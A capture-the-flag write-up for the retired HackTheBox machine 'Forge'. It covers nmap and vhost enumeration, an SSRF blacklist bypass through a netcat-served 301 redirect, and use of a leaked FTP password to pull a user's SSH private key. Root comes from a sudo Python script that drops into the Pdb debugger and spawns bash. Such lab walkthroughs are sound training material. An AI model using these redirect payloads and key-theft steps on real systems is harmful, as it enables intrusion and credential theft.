# Forge

This is the write-up for the box Forge that got retired at the 22nd January 2022.
My IP address was 10.10.14.12 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.111    forge.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/forge.nmap 10.10.11.111
```

```
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f78656629e4876b3cccb43ad25720ac (RSA)
|   256 79df3af1fe874a57b0fd4ed054c628d9 (ECDSA)
|_  256 b05811406d8cbdc572aa8308c551fb33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web service forwards to the hostname _forge.htb_ which hosts a website with images and on the top right is a button to upload an image:

![Upload image](forge_web-1.png)

It is possible to upload from an URL and when testing the IP of my local client, it makes a request to it:
```
nc -lvnp 80

Ncat: Connection from 10.10.11.111.
Ncat: Connection from 10.10.11.111:59776.
GET / HTTP/1.1
Host: 10.10.14.12
User-Agent: python-requests/2.25.1
```

Based on the _User-Agent_, the website may be developed with a Python framework like **Django** or **Flask**.

When testing for **Server Side Request Forgery (SSRF)** and browsing to localhost, it says that the URL contains a blacklisted address.

Searching for virtual hosts with **Gobuster**:
```
gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

The subdomain _admin.forge.htb_ exists and when browsing there, it says that only localhost is allowed.
This web service could be enumerated with the upload feature.

By creating a web service that redirects to another location, the blacklist can be bypassed.

Creating a file _(REQUEST)_ with the HTTP header _Location_ and HTTP status code _301 Moved Permanently_ to forward to another location:
```
HTTP/1.1 301 Moved Permanently
Location: http://127.0.0.1:21/
```

Starting a web service on port 80 with `netcat`:
```
nc -lvnp 80 < REQUEST
```

After using our IP on the upload feature, it shows a message from the FTP service, which proofs that internal services can be accessed:
```
Error : ('Connection aborted.', BadStatusLine("220 Forge's internal ftp server\r\n"))
```

Changing the location to _admin.forge.htb_:
```
HTTP/1.1 301 Moved Permanently
Location: http://admin.forge.htb/
```

After sending the request to our web service, a file is successfully uploaded and the HTML source code of the _Admin portal_ can be seen:
```
curl http://forge.htb/uploads/jQyP1hKpntnzoEHI7mI0
```
```html
<title>Admin Portal</title>
<!-- (...) -->
<h1 class=""><a href="/">Portal home</a></h1>
<h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
<h1 class="align-right"><a href="/upload">Upload image</a></h1>
```

The location can be changed to the _/announcements_ directory and uploaded again:
```
curl http://forge.htb/uploads/De9mdFb946dnKPytkxXo
```
```html
<!-- (...) -->
<li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
<li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
<li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
```

It has credentials for the FTP service and tells that the _/upload_ endpoint can use **FTP**.

Changing the location to _/upload_ and using the _"u"_ parameter to access the FTP service with the provided credentials:
```
HTTP/1.1 301 Moved Permanently
Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/
```

It successfully uploads the file and the HTTP response shows the contents of the FTP service:
```
curl http://forge.htb/uploads/EC712RNy4vvMhM0cl1lo
```
```
drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
-rw-r-----    1 0        1000           33 Dec 30 16:26 user.txt
```

As the _user.txt_ file is in the FTP service, this is most likely the home directory of the user which may have a _.ssh_ directory:
```
Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/
```
```
-rw-------    1 1000     1000          564 May 31  2021 authorized_keys
-rw-------    1 1000     1000         2590 May 20  2021 id_rsa
-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub
```

Stealing the private SSH key:
```
Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa
```
```
curl http://forge.htb/uploads/T3XtSx4YQHQGBX7GApDc -o id_rsa
```

As the user for the FTP service is called _"user"_, this should work to login via SSH:
```
ssh -i id_rsa user@10.10.11.111
```

## Privilege Escalation

When checking the root permissions with `sudo -l`, the user can execute a Python script with elevated privileges:
```
User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

The Python script starts a socket on localhost on a random port between 1025 and 65535:
```
sudo /usr/bin/python3 /opt/remote-manage.py

Listening on localhost:25095
```

With a second SSH session, we can connect to the socket with the password in the Python script and it shows four options:
```
nc localhost 25095
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```

By sending it anything other than a number, it errors and starts the **Python debugger**:
```
invalid literal for int() with base 10: b'test'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb)
```

In **Pdb** it is possible to run any system command:
```
(Pdb) import os
(Pdb) os.system("/bin/bash")
```

After executing `bash`, it will start a shell as root!
